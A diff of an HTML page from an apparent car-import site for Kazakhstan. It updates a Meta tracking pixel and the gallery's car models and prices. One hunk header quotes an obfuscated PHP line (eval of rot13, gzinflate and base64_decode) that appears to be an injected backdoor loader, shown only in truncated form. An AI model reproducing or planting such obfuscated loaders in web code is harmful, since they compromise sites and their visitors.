@@ -22,7 +22,8 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrFDsRJEvyaKNmbGbQnMzP7sjIzs7
     <link rel="stylesheet" href="css/bootstrap.css">
     <link rel="stylesheet" href="css/style.css">
     <link rel="stylesheet" href="css/fonts.css">
-	<!— Facebook Pixel Code —>
+
+    <!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -30,17 +31,15 @@ n.callMethod.apply(n,arguments):n.queue.push(arguments)};
 if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
 n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window,document,'script',
+s.parentNode.insertBefore(t,s)}(window, document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
- fbq('init', '2866357603385583');
+fbq('init', '873801476872818');
 fbq('track', 'PageView');
 </script>
-<noscript>
- <img height="1" width="1"
-src="https://www.facebook.com/tr?id=2866357603385583&ev=PageView
-&noscript=1"/>
-</noscript>
-<!— End Facebook Pixel Code —>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=873801476872818&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
 
 <!— Yandex.Metrika counter —>
 <script type="text/javascript" >
@@ -339,61 +338,61 @@ src="https://www.facebook.com/tr?id=2866357603385583&ev=PageView
                 <div class="col-1 isotope-item isotope-sizer"></div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 1"><a class="gallery-item" href="images/usa-1.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/usa-1.jpg" alt="авто из сша Volkswagen Passat" width="570" height="380"/>
+                      <figure><img src="images/usa-1.jpg" alt="авто из сша Toyota RAV4 2021" width="570" height="380"/>
                       </figure>
                       <div class="caption">
-                        <p class="caption-title">Volkswagen Passat 2015 - 3 500$</p>
-                        <p class="caption-text">Стоимость авто в Казахстане - 10 500$</p>
+                        <p class="caption-title">Toyota RAV4 2021</p>
+                        <p class="caption-text">Стоимость авто в Казахстане - 15.000.000 тнг</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 1"><a class="gallery-item" href="images/usa-2.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/usa-2.jpg" alt="авто из сша Ford Focus" width="570" height="380"/>
+                      <figure><img src="images/usa-2.jpg" alt="авто из сша Hyundai Santa Fe 2021" width="570" height="380"/>
                       </figure>
                       <div class="caption">
-                        <p class="caption-title">Ford Focus 2017 - 2 700$</p>
-                        <p class="caption-text">Стоимость авто в Казахстане - 9 500$</p>
+                        <p class="caption-title">Hyundai Santa Fe 2021</p>
+                        <p class="caption-text">Стоимость авто в Казахстане - 13.000.000 тнг</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 1"><a class="gallery-item" href="images/usa-3.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/usa-3.jpg" alt="авто из сша Volkswagen Tiguan" width="570" height="380"/>
+                      <figure><img src="images/usa-3.jpg" alt="авто из сша Toyota Camry 2021" width="570" height="380"/>
                       </figure>
                       <div class="caption">
-                        <p class="caption-title">Volkswagen Tiguan 2015 - 3 500$</p>
-                        <p class="caption-text">Стоимость авто в Казахстане - 11 500$</p>
+                        <p class="caption-title">Toyota Camry 2021</p>
+                        <p class="caption-text">Стоимость авто в Казахстане - 11.500.000 тнг</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 2"><a class="gallery-item" href="images/usa-4.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/usa-4.jpg" alt="авто из сша Nissan Rogue" width="570" height="380"/>
+                      <figure><img src="images/usa-4.jpg" alt="авто из сша Toyota Camry 2021" width="570" height="380"/>
                       </figure>
                       <div class="caption">
-                        <p class="caption-title">Nissan Rogue 2017 - 6 000$</p>
-                        <p class="caption-text">Стоимость авто в Казахстане - 14 000$</p>
+                        <p class="caption-title">Toyota Camry 2021</p>
+                        <p class="caption-text">Стоимость авто в Казахстане - 11.700.000 тнг</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 2"><a class="gallery-item" href="images/usa-5.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/usa-5.jpg" alt="авто из сша Hyundai Sonata" width="570" height="380"/>
+                      <figure><img src="images/usa-5.jpg" alt="авто из сша Toyota Highlander 2021" width="570" height="380"/>
                       </figure>
                       <div class="caption">
-                        <p class="caption-title">Hyundai Sonata 2013 - 3 000$</p>
-                        <p class="caption-text">Стоимость авто в Казахстане - 10 000$</p>
+                        <p class="caption-title">Toyota Highlander 2021</p>
+                        <p class="caption-text">Стоимость авто в Казахстане - 24.000.000 тнг</p>
                       </div>
                     </div></a>
                 </div>
                 <div class="col-12 col-md-6 col-lg-4 isotope-item" data-filter="type 2"><a class="gallery-item" href="images/usa-6.jpg" data-lightgallery="item">
                     <div class="gallery-item-image">
-                      <figure><img src="images/usa-6.jpg" alt="авто из сша Ford Fiesta" width="570" height="380"/>
+                      <figure><img src="images/usa-6.jpg" alt="авто из сша Hyundai Sonata 2021" width="570" height="380"/>
                       </figure>
                       <div class="caption">
-                        <p class="caption-title">Ford Fiesta 2016 - 2 000$</p>
-                        <p class="caption-text">Стоимость авто в Казахстане - 8 000$</p>
+                        <p class="caption-title">Hyundai Sonata 2021</p>
+                        <p class="caption-text">Стоимость авто в Казахстане - 13.100.000 тнг</p>
                       </div>
                     </div></a>
                 </div>
